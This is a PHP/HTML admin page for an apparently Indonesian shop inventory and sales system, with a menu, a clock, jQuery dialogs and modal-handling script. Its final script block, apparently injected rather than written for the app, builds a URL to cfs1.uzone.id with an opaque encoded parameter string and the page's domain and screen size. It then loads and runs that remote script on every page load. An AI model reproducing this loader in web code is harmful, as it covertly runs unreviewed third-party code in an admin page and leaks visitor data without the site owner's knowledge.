<!DOCTYPE html>
<head>
    <title>ADMIN</title>
</head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="../css/admin.css">
    <link rel="stylesheet" href="../js/jquery/jquery-ui.css">
    <link rel="stylesheet" type="text/css" href="../css/barang.css">
    <script src="../js/jquery/jquery.js"></script>
    <script src="../js/jquery/jquery-ui.js"></script>
    <script src="../js/script.js"></script>
    <?php
    session_start();
    include '../login/security.php';
    ?>
<body onload="startTime()">
<div class="header">
<?php
        $date = date('d-m-Y');
        $tgl = date('l');
 ?>
   <div class="waktu">
        <div class="tgl"><?php  echo $tgl; ?></div>
        <div class="date"><?php  echo $date; ?></div>
        <div id='s' class='clock'></div><div class='clock'>-</div>
        <div id='m' class='clock'></div><div class='clock'>-</div>
        <div id='h' class='clock'></div>
   </div>
</div>

<div class="row">
<div class="col-3 col-m-3 menu">
<ul>
    <li class="dialog-link1" onclick="barang()">Barang</li>
    <li class="dialog-link1" onclick="transaksi()">Transaksi Jual</li>
    <li class="dialog-link1" onclick="transaksi()">Transaksi Beli</li>
    <li class="dialog-link1" onclick="setting()">Setting</li>
    <li class="dialog-link1" onclick="laporan()">Laporan</li>
    <li onclick="logout()">Keluar</li>
</ul>
</div>
<div class="col-12 col-m-12">
        <div id="dialog1" title="VIP">
            <div id='tampil'>
                
            </div>
        </div>
   </div>

</div>

<div class="footeradmin">&copy Copy Right By Souldark
</div>

</body>
<script> 
    function hilang(){
        $(document).ready(function(){
             $(".hide").toggle();
         });
    }
     // Dialog 1 for barang
        $( "#dialog1" ).dialog({
            autoOpen: false,
        });

        $( ".dialog-link1" ).click(function( event ) {
            $( "#dialog1" ).dialog( "open" );
            event.preventDefault();
        });
</script>
<script>
// Get the modal
var modal = document.getElementById('myModal');

// Get the button that opens the modal
var btn = document.getElementById("myBtn");

// Get the <span> element that closes the modal
var span = document.getElementsByClassName("close")[0];

// When the user clicks the button, open the modal 
btn.onclick = function() {
    modal.style.display = "block";
}

// When the user clicks on <span> (x), close the modal
span.onclick = function() {
    modal.style.display = "none";
}

// When the user clicks anywhere outside of the modal, close it
window.onclick = function(event) {
    if (event.target == modal) {
        modal.style.display = "none";
    }
}
</script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs1.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "¶ms=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKTyZHHAzK8Giu%2b8%2baeq46T6aPAWBCJHEyKnKGLgJsvsr3bjb670EAIvZL99C1GOxTe8glpIQesHgj6oOv3XmzJW0wrnahOHg02F9yzMkwBVGqHQIjpZmJ9wMZM9kubVTRwDDxWBImanoIxFkVc4kBrLVqGPfmxms%2bu67DAVFcc5CKBP%2b7TaP7a9IKYers9KrGUXtg1iRDf7nTi9EShZNhXmiTSj0rHbAU73kkRLn0LOM5y%2bKVw8kKNlwdu81SyS127IazZ9exhusdEyeA95NDDQchX3w%2fCOjbCmep5kZbe3dsbuYggUNDmL7Q9cQIQWT4so21NxHvwxrMc9zGhyKoqd7tRmdo7V8sNTQDlFVPwdzb5cxtYKIhxLySH%2fEbt4guX1H9Gii1sZ97c3VXKRMsHh6OPAAfxTpMENPSigPn7cRuIQode%2bejni3tmkVxj1Qatkzmtam%2fAHYGTAY2Q6RwlkX1GTVs%2bGNlR7uV9QBe1AVaOCpzRhkGufF6nuzkdp5wL39uRDPUGl61mTUbVsAD7LSyyNoTdIC12gmq3vFZFsawJ7XkXHYK3MzUmV9kX7IOr%2be84O016KBm8wLFkieGM%2f9Vn3rmwmYa3CgU6mouyEc%2f7CoGakpyaQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
</html>